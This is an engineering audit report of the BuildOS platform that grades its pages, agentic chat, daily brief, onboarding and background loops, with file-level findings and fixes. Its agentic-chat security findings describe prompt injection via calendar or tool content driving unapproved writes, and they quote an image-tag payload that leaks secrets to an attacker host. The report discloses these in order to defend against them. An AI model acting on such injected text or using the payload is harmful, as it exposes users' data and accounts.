<!-- docs/technical/reviews/BUILDOS_FULL_PLATFORM_AUDIT_2026-07-11.md -->

# BuildOS Full Platform Audit — 2026-07-11

**Scope:** Core surfaces (`/today`, `/dashboard`, `/projects`, `/projects/[id]`, `/history`), the agentic chat (frontend + backend/orchestration), the loops (daily brief generation + project loops), and the new-user signup → onboarding → activation journey.

**Method:** 11 read-only audit agents fanned out across the surfaces and systems, each grounded in `file:line` evidence and the prior audit docs for its area; every critical/high finding went through an adversarial verifier that tried to refute it; a cross-surface strategy pass then rendered keep/merge/phase-out verdicts. Read-only — nothing was edited. The working tree's large uncommitted wave **is** the current state and was audited as such.

**One-line takeaway:** The platform is in genuinely good engineering health — the five core surfaces all grade **B**, and even the weaker systems are _well-built_, not broken. The problems are strategic and operational: (1) it is caught **mid-migration to `/today`**, and that half-finished migration is the single highest-leverage problem because it works _against_ the North-Star "remembered return" metric it was built to prove; (2) a **retention gap** — the daily brief that should bring users back defaults off, its onboarding opt-in silently fails, and it doesn't link into `/today`; (3) **built-but-unproven systems** graded C — the agentic-chat security wave was never started, project loops has never run for a real user, and the activation retention rung has two live bugs. The recurring pattern: **code investment is running ahead of validation and consolidation.**

**On the grades:** surfaces are B; three systems are C (agentic-chat backend, activation journey, project loops). The C's are not "bad code" — they're areas where a large, careful build is undercut by an unstarted security wave, an un-run feature, or a silent bug, so the _delivered_ value trails the engineering. Two of these areas were audited twice (a Fable pass and an Opus pass); where they disagreed on grade this report takes the more critical read.

---

## Verdicts at a glance

| Area                                 | Grade | Verdict                                                                     |
| ------------------------------------ | ----- | --------------------------------------------------------------------------- |
| `/today` — action surface            | B     | **Keep-invest** — the intended daily home, under-reached not over-built     |
| `/dashboard` — legacy overview       | B     | **Phase-out** (not yet phase-out-_ready_ — calendar blocks it)              |
| `/dashboard/calendar`                | B     | **Rework** — promote to top-level `/calendar` (the real phase-out blocker)  |
| `/projects` — list                   | B     | **Keep-maintain** — non-redundant console; needs a scale fix + decluttering |
| `/projects/[id]` — workspace         | B     | **Keep-invest** — best-engineered surface; kill the `/old` twin             |
| `/history`                           | B     | **Keep-maintain** — unique + cheap; fix the silent-empty-on-failure bug     |
| `/briefs` (standalone route)         | —     | **Merge-into-other** — orphaned route nothing links to                      |
| Agentic chat — backend/orchestration | C     | Sound + well-tested; **Wave 3 security never started** (S1 CRITICAL open)   |
| Agentic chat — frontend              | B     | Good shape; flagship modal growing (2,958 lines); no turn-retry affordance  |
| Daily brief loop                     | B     | Works, but for ~1 real recipient; retention + observability gaps            |
| Project loops                        | C     | Production-grade code, **never run for a real user** — zero value delivered |
| Signup → onboarding → activation     | C     | First-win rung built well; **return rung has two live bugs**                |

---

## The two things to fix this week

### 1. Finish the `/today` redirect flip (the North-Star contradiction)

Three separate audits (surfaces strategy, `/today`, `/dashboard`, daily-brief, activation) independently surfaced the same defect: **the migration to `/today` is half-done.** Only two entry points were flipped — the bare domain `/` (`hooks.server.ts:509-515`) and the onboarding `ReadyStep` (`ReadyStep.svelte:159`). Every other funnel still hardcodes `/dashboard`:

- Password login success default → `/dashboard` (`auth/login/+page.svelte:207`, `auth/login/+server.ts:173`)
- Both Google OAuth callbacks `successPath: '/dashboard'` (`login-callback/+page.server.ts:47`, `register-callback/+page.server.ts:47`)
- Gmail callback default → `/dashboard` (`gmail-callback/+page.server.ts:16,249`)
- Already-signed-in guards on `/auth/login`, `/auth/register`, post-onboarding → `/dashboard` (`+page.server.ts:9` each; `onboarding/+page.server.ts:54`)
- Authenticated logo href → `/dashboard` (`Navigation.svelte:787`)
- Nav shows **both** "Today" and "Dashboard" as top-level tabs (`Navigation.svelte:215-221`)

**Net effect:** a returning user who logs in lands on the _old_ dashboard and never sees `/today`'s "What changed" receipt feed — which is exactly the remembered-return flow `/today` was built to prove. The North-Star metric and the routing are working against each other right now. The strong loop telemetry on `/today` can't measure a return that routing prevents users from reaching.

> **Verifier note (important nuance):** the adversarial pass _adjusted_ the "half-done" framing on the narrow point of intent. tasker/26 decision 1 ("flip both now") scoped the flip to _exactly two_ targets (bare `/` and `ReadyStep`), and **both are correctly flipped and live-verified**. So the auth-path `/dashboard` landings were never in decision 1's scope — this is unfinished-migration work, not a regression against what was decided. The _behavioral_ observation stands and is confirmed across four agents: login/OAuth-initiated sessions do land on `/dashboard`, not `/today`.

**Fix (low effort, high leverage):** repoint the auth-funnel _defaults_ to `/today` while preserving invite/`redirect`/`pendingRedirect` targets, and add an onboarding-completion guard to the `/`→`/today` flip so incomplete users go to `/onboarding` rather than an empty `/today` (see §Activation finding on the bare-domain onboarding bypass).

### 2. Fix the daily-brief opt-in path (the retention repair)

The activation slice manufactures a first structured win reliably, but the **return rung is broken**:

- **Silent opt-in failure (high):** checking "Email Daily Brief" in onboarding PUTs `/api/notification-preferences {should_email_daily_brief:true}`, but that handler requires a _pre-existing_ `user_brief_preferences` row with `is_active=true` and 400s otherwise (`notification-preferences/+server.ts:132-151`). That row is only created lazily on `GET /api/brief-preferences`, which the onboarding flow **never calls**. `NotificationsStepV3` swallows the 400 (console.error only) **and still reports success** upstream (`onEmailEnabled?.(wantEmail)` fires regardless, line 77), so `ReadyStep` tells the user "Check your daily brief tomorrow morning" while `should_email_daily_brief` was never persisted.
- **Defaults off (high):** `wantEmail` defaults `false` (`NotificationsStepV3.svelte:17`), and the scheduler only generates for `is_active=true` prefs (`scheduler.ts:623-627`). So most new users leave onboarding with no brief, no calendar, no SMS — nothing pulls them back on day 1–7 except the welcome email sequence.

**Fix:** make enabling any brief channel idempotently upsert `user_brief_preferences (is_active=true)` in the same request; only set `emailEnabled` after a 2xx; and either default the email brief **on** (opt-out) for users who created a project, or pre-generate their first brief at onboarding completion so they experience it once.

---

## Cross-cutting themes

**A. Three "recent activity" implementations, three "create a project" flows, two overview homes.** The product has accreted parallel implementations of the same job:

- _Recent activity:_ `/dashboard`'s unified feed + recent-chats panel + brief widget vs `/today`'s What-Changed receipts vs `/history` vs `/briefs`.
- _Project creation:_ onboarding braindump (`ProjectsCaptureStep`) vs `/today` quick-capture (writes a **chat session**, not a braindump) vs `/projects` "New Project" guided agentic chat (`contextType: project_create`). A user learns braindump-first in onboarding, then gets handed a Q&A chat when they click New Project. This is the highest-leverage _strategic_ cleanup: one canonical "messy thinking in → structured project out" flow, reused everywhere.
- _Overview home:_ `/today` and `/dashboard` both in the nav, funnel split between them.

**B. Silent-degradation risk is rising as the product leans on RPCs.** `/history` masks RPC/migration failure as an empty "No history found" archive with no error signal (`+page.server.ts:249-266` catches and resolves an empty result, so the error UI never fires). The dashboard analytics service silently degrades from its RPC to a 340-line legacy fallback on error. Combined with the **known unapplied prod migration** (see below), consolidating more surfaces onto RPC-backed feeds raises the cost of invisible migration lag. `/history`'s fix (rethrow so the error UI fires) is the single highest-leverage reliability change on the surfaces.

**C. Carrying costs that no longer earn their keep.** Live `/projects/[id]/old` classic page (2,309 lines + ~1,734 lines of old-only components, still actively edited); `/projects/create` wrapper duplicating the inline modal; admin-only ontology graph (~200 lines) embedded in the user-facing projects list; the 1,221-line loops audit tracker **static-bundled** into the project route while loops are OFF in prod; `djtryserver.ts` (474 unrouted lines) in the chat stream directory; V2 onboarding config + 14 placeholder assets shipped alongside the live V3 flow; brief audio TTS subsystem firing on every brief completion for admins only.

**D. ~~The known unapplied prod migration~~ — RESOLVED 2026-07-12.** `20260706020000_secure_daily_brief_engagement_metrics.sql` REVOKEs anon/authenticated on `daily_brief_engagement_weekly_metrics` (a 7/06 live anon-key read confirmed company-wide send/open/click/reactivation aggregates were exposed via PostgREST). **DJ applied this to prod on 2026-07-12 — the exposure is closed.** Remaining tidy-up: remove the temporary `as any` casts in the admin endpoint after `pnpm gen:all` picks up the view type.

---

## Surfaces

### `/today` — Grade B — Keep-invest

Concretely implements the Capture → Structure → Surface → Decide → Update loop on one page: a merged agenda (calendar events + tasks on a shared time rail with a now-marker, all-day chips, an "Anytime today" band), a "What changed since you were here" receipt feed on `onto_project_logs`, inbox/overdue chips, quick voice-capable capture, and per-task/event/receipt/day chat entry points. Nearly every block is actionable; the loop telemetry is thorough and content-safe (IDs/counts-only envelope, no-ops without a PostHog key); server load is genuinely parallel and RPC-backed; Inkprint and mobile/a11y discipline are clean.

**Findings:**

- **[high] Redirect flip half-done** — covered in §The two things above.
- **[medium] `/`→`/today` hook has no onboarding guard** — the flip redirects _any_ logged-in user hitting `/` to `/today` with no `onboarding_completed_at` check, and `/today` has no onboarding gate. A user who signed up but clicks the logo or visits the bare domain mid-flow is silently dropped onto `/today`'s generic empty state — bypassing the onboarding forcing-function tasker/26 was built to create.
- **[medium] Project-summaries RPC runs twice per view, re-fires on every modal close** — `getTodayFeed` and `getWhatChangedFeed` both call `fetchProjectSummaries` (full per-project count aggregation) though both consumers use only `id/name/state_key`; neither caches; and `refresh()` + `loadChanges()` + `loadInboxCount()` all re-fire on every chat/inbox/overdue/task-modal close. Scales badly with project count (DJ has ~84). **Fix:** a names-only path is strictly cheaper with zero UX loss.
- **[low] "Clear day ahead" empty state ignores overdue tasks** and gives zero-project users no create path (only chat).
- **[low] Quick capture is not truly inline** — opens the full `AgentChatModal`; receipts only refresh on close; the resulting receipt is attributed to "Agent chat" rather than "You" (undersells the user's authorship of the loop-closing action). Known tasker/25 follow-up.
- **[low] Today tasks query returns ALL in-progress tasks across every project regardless of date** (bare `state_key.eq.in_progress` OR-clause), capped silently at 200 — the "Anytime today" band can balloon past "today" for power users.

### `/dashboard` — Grade B — Phase-out (not yet phase-out-ready)

A single heavy component (`AnalyticsDashboard.svelte`, ~1,584 lines) rendering greeting, brief widget, AI-inbox/overdue/invites/agent-connect banners, active-projects grid, shared-with-me grid, unified recent-activity feed, recent chats, lifetime stats — plus a large self-contained calendar sub-route (`/dashboard/calendar`, 1,167 lines). The engineering is good (the 7/07 responsiveness audit hardened it well: single-RPC load, abort-guarded fetches, idle-preloaded lazy modals). The problem is strategic redundancy.

**Findings:**

- **[high] Split login funnel keeps dashboard first-class** — §The two things.
- **[high] `/dashboard/calendar` is the one unique capability with no home on `/today`** — the real phase-out blocker. Everything else has a natural home (invites→`/invites`, chats→`/history`, brief→`/briefs`, activity→`/today` what-changed), but the full calendar is reachable only from a dashboard header button and is absent from the nav.
- **[medium] Onboarding-progress gate keys on `/dashboard` only** (`+layout.server.ts:146-150`), so a partially-onboarded user on `/today` can show a false "urgent" onboarding nav state.
- **[medium] `AnalyticsDashboard` (~1,584 lines) duplicates `/today`** — inbox + overdue modals are literally imported by `/today` from the dashboard folder. Every inbox/overdue/brief change risks being made twice. **Freeze feature work here.**
- **[medium] 340-line legacy fallback query path** in the analytics service duplicates the RPC and silently degrades on RPC error.
- **[low]** Debug `console.log` in calendar production click handlers; calendar opens projects/tasks in a **new browser tab** (`window.open`) breaking in-app nav; `dashboard.css` (202 lines) carries likely-unused animation rules.

### `/projects` — Grade B — Keep-maintain

Not a vestige — the only place projects are first-class objects with state, an AI "Next:" step, and rollup counts. Merges Planning+Active into one activity-sorted "Current Work" band with recency separators; skeleton loading is best-in-class (exact-count skeleton rows, race-guarded stream hydration); server rollups are one consolidated RPC (no N+1); strong Inkprint + Svelte 5 compliance.

**Findings:**

- **[high] Loads and renders every accessible project — no limit/pagination/virtualization.** `fetchProjectSummaries` omits `p_limit` so the RPC returns ALL accessible projects with full LATERAL rollups every load, and the client renders every row with no windowing. The RPC _already supports_ `p_limit`. A real ceiling for power users — **DJ already hits this at 84 projects.** Server fix is cheap; the client list rendering is the larger change.
- **[medium] Project-creation metaphor fragmented** — "New Project" launches a guided agentic chat, but onboarding/`/today` teach braindump-first. (Cross-cutting theme A.)
- **[medium] `/projects/create` is a near-vestigial wrapper** duplicating the inline modal (two code paths, two toasts, one action).
- **[medium] Legacy `/projects/[id]/old/` detail route (73KB) still live and recently edited** (touched Jul 9).
- **[low]** Admin-only graph subsystem (~200 lines) embedded in the list page; navigation prefetch hardcodes `milestone_count`/`risk_count` to 0 (wrong skeleton counts); uses legacy `$app/stores` instead of `$app/state`.

### `/projects/[id]` — Grade B — Keep-invest (the best-engineered surface)

The platform's largest and best-engineered surface. The v2 workspace (~1,940 lines) is action-driven: header card with AI next-step, "Start here" memory snapshot, Pulse strip, task Kanban / MobileTaskBoard, an EntityTabStrip of pill tabs, documents tree. **The load path is textbook** — single access+skeleton RPC for instant paint, one lean `/full?profile=v2-initial` hydrate, idle-gated secondary work, lazy-imported modals and graph. Mobile is first-class. **This load pattern is the one other heavy surfaces should copy.** No data-loss or security issues found.

**Findings:**

- **[medium] Two full project-page implementations maintained in parallel** — v2 + `/old` classic (2,309 lines + ~1,734 lines of old-only components), with a user-facing "Classic view" toggle keeping `/old` reachable. Both touched in the same recent commit — active dual maintenance. **Set a sunset date.**
- **[medium] Loops audit-tracker (1,221 lines, OFF in prod) is statically bundled** into the project route chunk — Vite can't tree-shake it (runtime env flag), so dead-in-prod loops UI ships on the hot path. **Fix:** lazy-import behind the flag (trivial).
- **[medium] Task editing split across a modal and an orphaned 2,223-line focus page** — the richest single-task surface (`/tasks/[task_id]`) is unreachable from the primary v2 workspace (Kanban opens the lighter modal instead).
- **[low]** Goals/Milestones/Plans/Risks pill tabs are raw ontology CRUD (list + add/edit modals) — where the raw schema leaks through the thinking-environment framing; "Start here" memory preview needs a third fetch after hydration; header settings menu portal doesn't reposition on scroll/resize.

### `/history` — Grade B — Keep-maintain

The only unified archive of captures (`onto_braindumps`) + chats (`chat_sessions`), doubling as a re-entry launcher into past thinking. Well-engineered: bounded indexed RPC (`get_history_page_v1`), trigram + composite feed indexes, `limit+1` hasMore, streamed skeletons, in-function `auth.uid()` guard, real test coverage. Does **not** overlap `/today` (change receipts, different data) or `/briefs`.

**Findings:**

- **[medium] RPC/migration failure renders as an empty archive with no error signal** — highest-leverage reliability fix on the surfaces (cross-cutting theme B). Makes prod migration lag invisible here.
- **[medium] The "Captures" half is likely a thinning legacy surface** — `onto_braindumps` has exactly one INSERT site (`POST /api/onto/braindumps`) with no in-app caller found; the modern `/today` quick-capture writes a **chat session**, not a braindump. Confirm what still feeds Captures, then either re-feed it or collapse history to "Chats."
- **[medium] Dashboard "Recent chats" deep-links dead-end** — dashboard links sessions with `message_count >= 1`, but `/history`'s RPC hides sessions with `< 3` messages and no summary, so short sessions land on `/history` with no card, no modal, no explanation.
- **[low]** `invalidate('/history')` after linking a braindump chat is a silent no-op (declared dependency is `history:data`); status filter excludes chats for pending/processing/failed states; every card open triggers a full server-load rerun; hand-duplicated interfaces + a sort-vs-display timestamp mismatch.

### `/briefs` — Merge-into-other

A full route (`page.server` + `page.svelte` + `+server`) that is **effectively orphaned** — nothing in the app links to it, it's not a nav tab, and `BriefStatusIndicator` routes to `/projects?tab=briefs` instead (`BriefStatusIndicator.svelte:81-83`). Its "here's what moved" job now overlaps `/today`'s What-Changed feed. Resolve deliberately: fold brief-reading into `/today` and retire the standalone route, **or** make `/briefs` canonical and actually link it. Don't leave a first-class route no surface points at.

---

## Systems

### Agentic chat — backend / orchestration — Grade C

A large, well-tested, largely sound system with one persistent gap: **the security-hardening wave (Wave 3 of the 2026-07-01 deep audit) was never started**, so its known findings — including the CRITICAL-flagged one — remain open on disk. Architecture: `POST /api/agent/v2/stream` (a 4,212-line route) resolves session/scope, loads context (RPC + fallback + prewarm cache), hands a tool loop to the stream-orchestrator that batches pure-read tool calls (concurrency 3), memoizes repeat reads, and streams SSE with a 12s heartbeat. Durable Agent Runs diverge sharply from interactive chat: the worker enforces `scope_mode`/`allowed_ops` and **stages writes into a reviewable ChangeSet**, whereas interactive chat commits writes immediately through RLS-scoped REST routes with **no policy layer and no confirmation**.

Of the four ranked items from the 7/01 deep audit, **three are genuinely fixed in code** (parallel tool-calls, SSE heartbeat, context-narrowing via payload compaction) and one is mitigated/instrumented (prewarm hit-rate). Excellent test coverage (~82%, regression tests named for past bugs). Cost is a rounding error (~$0.47/21 days); the real problem is **latency** (passes × ~7s), which the team is correctly attacking.

**Findings:**

- **[high] Interactive chat write path bypasses the policy layer** (S1, flagged CRITICAL, Wave 3 never started) — chat writes commit immediately via `/api/onto/*` REST routes and never consult `shared-agent-ops/policy.ts`; no `requiresConfirmation`/destructive gate; no per-turn external-content flag. A prompt-injection planted in a calendar description, shared doc, or web/MCP tool result triggers a same-turn mutation with zero human approval. Bounded by RLS (own account only), so escalation-of-intent within one account, not cross-tenant. **Reuse the ChangeSet staging path Agent Runs already have.**
- **[high] S2 zero-click remote-image exfiltration still open** — the chat sanitizer allows `img` with unrestricted remote `src` and there's no chat-surface CSP `img-src`. Combined with S1, an injected `<img src=attacker.com/leak?d=SECRET>` auto-fetches on render. **The cheapest Wave 3 item, flagged 10 days ago, still unshipped.**
- **[high] Worker death mid-agent-run orphans the run at `status=running` forever — no sweeper (NEW)** — not covered by prior audits. If the worker dies mid-loop (Railway deploy, OOM), the row stays `running`; retry re-enters with no `continuation_from`, `isClaimableStatus` returns false, and the job completes without finalizing. Commit-mode writes stay applied but unreported; a chat-spawned run never injects its completion message. There's a `reclaimStalledProjectLoopRuns` sweeper for _loops_ but no equivalent for `agent_runs`.
- **[medium] Web lambda-death durability half-done (D4b)** — no `waitUntil` anywhere in the stream route; detached-turn survival is accidental; no cron sweeper keyed off the `last_progress_at` heartbeat that Wave 2 added.
- **[medium] Worker agent-run transcript injects raw tool JSON with no untrusted-data wrapper (S14)** — unlike the web path; and the worker executes writes in commit mode.
- **[medium] Two parallel streaming implementations** — the live `OpenRouterV2Service.streamText` override (carries the fixes) vs the dormant base `smart-llm` `streamText` (WP-6 found 8 lost fixes). Latent footgun — the last time they drifted, a mid-stream error-handling fix was silently lost.
- **[medium] Model tiering shipped but is dark in prod** — `FASTCHAT_INITIAL_PLAN_MODEL_TIERING` defaults to `off`, appears in no `.env.example`/`vercel.json`, so unless set in the Vercel dashboard it's off. The 7/08 audit called this a top latency lever and "zero code" to flip. The two biggest measured latency wins are either dark (tiering) or unbuilt (WP-9 stronger tool-caller).
- **[medium] Retained security debt: S5 plaintext bearer token at rest** — the chat bootstrap link stores a plaintext bearer token, never reaped (deep-audit S5, CONFIRMED-open). Hash at rest + add a reaper.
- **[low]** Split cost/latency budget regimes; `djtryserver.ts` (474 unrouted lines) still present; `+server.ts` is a 4,212-line monolith on the most security-sensitive file — decompose _before_ the Wave 3 changes land.

**Why C, not B:** the read/reliability engineering is genuinely strong, but a large fraction of the ~4,200-line route + 1,400-line repair module + read-loop/forced-synthesis guard stack exists to _babysit a budget tool-caller_ (`deepseek-v4-flash`) — and meanwhile the security wave that protects a system mutating real user data was never started (S1 CRITICAL, S2, S3, S5 all open). The delivered safety trails the delivered capability. The highest-leverage move is **WP-9 (a stronger tool-caller), framed as complexity _reduction_** — measure how much guard code can be deleted once the model stops misbehaving; the cost ceiling ($0.47/21d) is irrelevant.

**Strategic read:** the orchestration complexity earns its keep on the read/reliability side (three independent audits all concluded "no rewrite needed" — the right call) but **not on the write-safety side of interactive chat**, which is exactly where a thinking environment that mutates real user data is most exposed. The biggest consolidation win is **unifying the interactive-chat and Agent-Run write paths** — every security finding (S1/S3/S14) and one durability gap trace back to interactive chat growing its own write path that skips the safer machinery next door. Also: audit debt is accumulating faster than fix debt (~24 chat audit docs since April) — consider a freeze on new chat audits until Wave 3 ships; the constraint is execution, not discovery.

### Daily brief loop — Grade B

Architecturally sound; the 7/06 audit's Tier-1 correctness work genuinely landed (idempotent per-(user,date) generation, no more force-regenerate on click, hardened email send-path). Pipeline: timezone-aware cron (or the `ensure-today` app-open endpoint) enqueues `generate_daily_brief`; the worker runs one cheap `deepseek-v4-flash` call per project + an exec-summary call, assembles markdown, emits `brief.completed` fanned out to in-app/email/(nominally)SMS, with optional audio. Cost per brief is genuinely low. **The waste is who it reaches, not unit price — the loop effectively works for one real recipient (DJ).**

**Findings:**

- **[high → RESOLVED 2026-07-12] Engagement-metrics view was anon-readable in prod** — migration `20260706020000` **applied by DJ 2026-07-12**; exposure closed (cross-cutting theme D).
- **[high] Re-engagement generates LLM briefs for users with no reachable delivery channel** — the scheduler enqueues on `shouldSend` with no channel check; the WP-10 reachability gate was never built. Compounded by exact-day backoff gates (`=== 4`, `=== 14`) that forfeit the touch entirely on a single missed cron eval. **Fix:** require ≥1 deliverable channel before generating, or set `ENGAGEMENT_BACKOFF_ENABLED=false` in Railway until delivery works.
- **[high] App-open auto-generation trigger stranded on `/dashboard`** — `ensure-today` is wired into `DashboardBriefWidget`, rendered only on `/dashboard`; users now land on `/today`, which has zero brief references. Two uncommitted workstreams (7/06 brief trigger, 7/11 `/today` flip) were never reconciled.
- **[medium] Stored/in-app brief is still the 39KB wall (WP-7 deferred)** — only the email is patched; the brief stored in `executive_summary` and shown in `/briefs` is the full 3,500–6,000-word wall for 15–27-project users.
- **[medium] Brief deep-links point at `/projects`, not `/today`** — a digest dead-end; the morning brief should pull users into the action surface but routes to a project list.
- **[medium] No cost or generation-failure observability** — per-project cost buried in metadata JSON, no aggregate, no `llm_usage` log, no "briefs failed today" admin card. **The founder is flying blind on brief health.**
- **[medium] SMS deliveries marked "sent" while Twilio send is parked** — corrupts any delivery metric that counts SMS.
- **[low]** Brief audio is admin-only dead weight; `ENGAGEMENT_BACKOFF_ENABLED` is undocumented (in no `.env.example`); scheduler ±30min guard lacks a briefDate filter (mostly backstopped by the idempotency skip).

**Strategic read:** the re-engagement machine is the clearest case of complexity not earning its keep — three engagement tiers polishing a curve that reaches ~zero reachable users. And the biggest missed opportunity: **the brief and `/today` evolved in parallel and don't connect.** The morning brief should be the ritual that pulls a user back into `/today` daily; today it links to `/projects` and its trigger isn't even wired to `/today`. The brief is also trying to be two products at once — an exhaustive archived record (fine for `/briefs` history) and a daily nudge (should be ~5 lines + one next action). Split stored-brief from delivered-digest.

### Signup → onboarding → activation — Grade C

Materially better than the 2026-06-26 audit. A new user signs up (email/password or Google), lands on `/dashboard?onboarding=true`, and a welcome modal routes them into a 4-step V3 flow: intent+stakes → inline first brain-dump → transformation receipt → notifications → ready → "Start your day" → `/today`. **The just-built activation slice (tasker/26) is real and on disk and well-executed:** the inline capture step, the transformation receipt ("what BuildOS understood / created / will remember"), and a **server-side, DB-backed zero-project gate** on `complete_v3` all check out — and the gate is sound because an `AFTER INSERT` trigger guarantees the creator gets a membership row, so it won't false-reject a legitimate first project. This directly closes the 41.4% false-positive completion hole. The welcome email sequence (5 emails, day 0/1/3/6/9, local send window, branches on live product state, banned-AI-phrase guard) is excellent and on-brand.

**Findings:**

- **[high] Onboarding daily-brief opt-in silently fails and falsely reports "enabled"** — §The two things.
- **[high] The primary return driver (daily brief) defaults OFF** — §The two things.
- **[medium] Onboarding is not enforced; its nudge is stranded on `/dashboard`** after the landing flip — `completedOnboarding` is computed but never redirected on; the nudge modal only renders when the path is exactly `/dashboard` and is localStorage-dismissible; a user who dismisses it or arrives via `/today` can use the app indefinitely with `onboarding_completed_at=null`, bypassing the WP-3 gate (which only guards the completion _action_, not entry).
- **[medium] Explore/skip path drops users into a blank workspace** with no first win and no sample project (old audit P2 #7, deferred). The weakest activation path — one click from the default for the "just want to try it" intent.
- **[medium] The North-Star "remembered return" metric is instrumented but not operationalized** — the events fire, but there's no assembled reopen-7d cohort definition, and the WP-5 baseline reads 0% (proxy limitation). The retention half of activation is not yet a watchable metric.
- **[low]** Legacy V2 onboarding config + 14 placeholder assets are dead weight; `/today` zero-data empty state is weaker than the relief framing the old audit added to `/dashboard`, and its capture prompt ("What changed?") assumes prior state.

**Strategic read:** the slice did exactly what it set out to for the **first rung** (first structured win) but only that rung got built well; the **return rung is unreliable** (broken opt-in + off-by-default brief). If you fix one thing this week, fix the brief opt-in — cheapest, highest-leverage retention repair. There's also a philosophical inconsistency to resolve deliberately: the welcome emails and receipt copy sell "BuildOS shows back up for you," yet the mechanism that delivers that defaults off. Either commit to opt-out briefs or stop promising the remembered return in first-run copy.

### Agentic chat — frontend — Grade B

In genuinely good shape; the four waves of the 7/09 modal audit landed on disk (`$state.raw` + WeakMap timeline memoization, throttled streaming-markdown parse, status-aware error surfacing, a single idempotent `releaseSessionResources()` teardown, 45s inactivity → reconcile). The minimize-to-notification feature is well-engineered, including the keep-alive "mounted-hidden" resume that avoids the stale-snapshot feel. Mobile is a real strength (bottom-sheet at `100dvh`, safe-area insets, a `--keyboard-height` visualViewport avoider, `content-visibility` virtualization). The concern is **trajectory, not correctness**: `AgentChatModal.svelte` is now **2,958 lines (up from 2,758)** — the minimize work added ~200 lines and the 7/09 audit's structural-simplification wave was deferred, so the flagship component is growing, not shrinking.

**Findings:**

- **[medium] Stream-controller teardown is hand-rolled 6–7 times** — the "finish this run" sequence is duplicated with subtle variations across every terminal path (`agent-chat-stream-controller.svelte.ts:678-689,692-706,738-779,847-865,895-931,954-964`); a fix to one path can silently miss the others. This is the 7/09 audit's deferred `#finishRun()` consolidation — the highest-leverage cleanup, de-risked by a 938-line sibling test suite.
- **[medium] 2,958-line god component that grew post-refactor** — the deferred extraction targets (agent-run realtime, thinking-block, assistant-text buffering) plus two large getter/setter dependency mirrors (`StreamControllerDeps` 27 fields, `SSEHandlerDeps.state` 20 fields) are what keep the modal from shrinking.
- **[medium] Streaming rebuilds the timeline array + re-runs activity-tab filters every rAF flush** — `liveTimelineItems` reads the whole `messages` array (reassigned every text flush), so the merge+sort and three `$derived` filters recompute each frame even on the Chat tab during pure-text streaming. Bounded but real main-thread churn. **Fix:** gate the derive on a structural version counter that bumps only on add/remove.
- **[medium] No reconnect/retry affordance when a turn terminally fails** — on reconcile failure the user gets a red "Connection lost" banner with no retry button and no draft to resend (`AgentChatModal.svelte:1424-1441,2573-2581`); the only "Try again" is on the session-_load_ path. A hung/dropped turn dies silently into a banner. **The biggest UX gap — a one-affordance fix.**
- **[medium] Keep-alive seamless minimize is Navigation-only; every other surface hard-parks** — `onParked`/`hidden` are wired only on Navigation's mounted-hidden instance; from `/today`, project pages, inbox modals, onboarding, and task-edit, `minimizeToStack` falls through to `hardParkAndClose` (full teardown, DB-snapshot resume — the exact stale state the spec set out to avoid). Reopening any card routes to the global modal and loses embedded chrome / `inboxResolutionActions`.
- **[low]** Redundant polling while the hidden keep-alive stream is still live; dead event types (`'text'`, `'operation'`) linger in `TURN_EVIDENCE_EVENT_TYPES`; unknown `done.finished_reason` finalizes as a clean success (an early-stopped agent can read as a finished answer).

**Strategic read:** the complexity mostly earns its keep — durable detached turns, cross-page keep-alive resume, and voice/attachment/agent-to-agent modes are real surface, and the controller extraction (stream/SSE/prewarm/voice/attachments/timeline separately tested) is good architecture. The problem is the _orchestrator_ (the modal itself) never got the same treatment. Do the `#finishRun()` consolidation before any further feature work touches the stream lifecycle, and add the retry affordance — everything else recovers gracefully, but the one path that can't recover leaves the user to retype with no button to press.

### Loops — project loops (`buildos_project_loop`) — Grade C

A per-project background reconciliation engine: a `project_loop_runs` row + a `buildos_project_loop` queue job generates **reviewable suggestions** (doc-organization, outdated-docs, drift, task-conflict) and a project brief, or runs a Complete Project Audit (deterministic scaffold + evidence-grounded LLM synthesis). **It never mutates a project directly** — every output lands as a `project_suggestion` → `inbox_items` (AI Inbox); `/today` surfaces only a pending inbox count. Triggers: manual, activity-burst (5 onto mutation routes), a new debounced review-signal layer, end-of-day (now hourly, per-user-timezone), scheduled audits. **The engineering is genuinely production-grade** — mutation safety, dedup, idempotency, lifecycle, and a `*/30` reclaim sweeper are all handled carefully, and the system has moved _past_ the 7/04 audit (Tier 0/1 committed; Tier 2 per-user-timezone + fan-out cap done; a new `project_review_signals` debounce table added 7/07).

**The grade is C because the system remains flag-gated OFF in prod and has never run for a single real user — net user value delivered to date is zero.** The code investment is far ahead of the validation investment.

> ⚠️ **Naming disambiguation (don't let this confuse a roadmap call):** there are two different "loops." (1) **`buildos_project_loop`** = this background suggestion/audit engine — **OFF, never validated.** (2) **`/today` loop telemetry** (`loop-telemetry.ts`) measures the _user's_ thinking loop (capture→surface→decide→update) — **LIVE and shipping, healthy.** "Loop telemetry is live" is NOT evidence the project-loops engine works.

**Findings:**

- **[high] Never enabled or validated in prod** — audit item #9 (set both flags, confirm migrations, run one manual validation) has never been executed. Zero suggestions have ever reached a real user; the only two historical apply attempts were blocked by the old freshness guard with 0 ops applied. Every downstream question (is task-conflict smart? are suggestions helpful or naggy? is the audit trustworthy?) is unanswerable until this runs once. **Enable for DJ's own account or a single-project canary first, watch cost + quality for a week.**
- **[high] Two new 0707 migrations must be applied before enabling** — `20260707050000_project_review_signals` (the debounce table the burst path writes) and `20260707060000_project_audit_inbox_source`. The 7/04 checklist only tracks 0703/0704; flipping the flags without these = immediate 500s on the new code paths on first fire.
- **[high] No global cost/volume ceiling** — the only guard is a soft per-run $0.35 cap; no per-user daily budget, no global spend ceiling, no circuit breaker. With the flag on, a heavy day produces many burst loops + end-of-day loops (up to 10/user) + burst audits, each up to ~5 LLM calls, throttled only by `batchSize=5`. **First prod enable with unbounded aggregate spend is the scariest unknown — add a ceiling before broad rollout.**
- **[medium] `project_review_signals` is untyped** — not in generated types, so the write path uses `(admin as any)` casts on an active mutation path (typo silently no-ops). Run `pnpm gen:types` after the migration lands.
- **[medium] The 7/04 audit doc has drifted** — still says "Tier 1 uncommitted" and lists timezone/fan-out + debounce as open/absent; all are done on disk. Refresh or supersede it.
- **[medium]** Machinery expanding ahead of any real signal (task-conflict's payoff is 4 write-only props flags nothing reads; the 7/07 debounce fans one backlog-cleanup into BOTH a light loop AND a full audit); task-conflict intelligence is thin (≤20-task scan, approve/dismiss only, no merge/link/convert).
- **[low]** `critical_change` trigger reason plumbed with no producer (dead code); web-side `dev ||` force-enables loops in dev regardless of the flag (can't test the off-state locally).

